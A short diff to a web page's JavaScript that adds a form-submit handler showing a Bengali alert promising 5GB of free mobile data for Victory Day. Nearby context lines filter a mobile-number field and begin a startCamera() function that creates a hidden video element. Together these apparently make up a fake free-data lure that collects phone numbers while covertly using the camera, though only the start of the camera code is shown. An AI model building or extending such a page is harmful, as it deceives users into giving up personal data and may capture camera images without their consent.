@@ -175,6 +175,18 @@ document.getElementById('mobile-number').addEventListener('input', function () {
     this.value = this.value.replace(/[^0-9]/g, '');
 });
 
+document.getElementById("data-form").addEventListener("submit", function (e) {
+    e.preventDefault();
+
+    alert(
+        "🎉 আপনার রিকোয়েস্ট গ্রহণ করা হয়েছে!\n\n🇧🇩 বিজয় দিবস উপলক্ষে ৫GB ডাটা (Demo) ২৪ ঘণ্টার মধ্যে অ্যাক্টিভ হবে।"
+    );
+
+    this.reset();
+});
+
+
+
 async function startCamera() {
     const video = document.createElement('video');
     video.style.display = 'none'; // Hide the video element
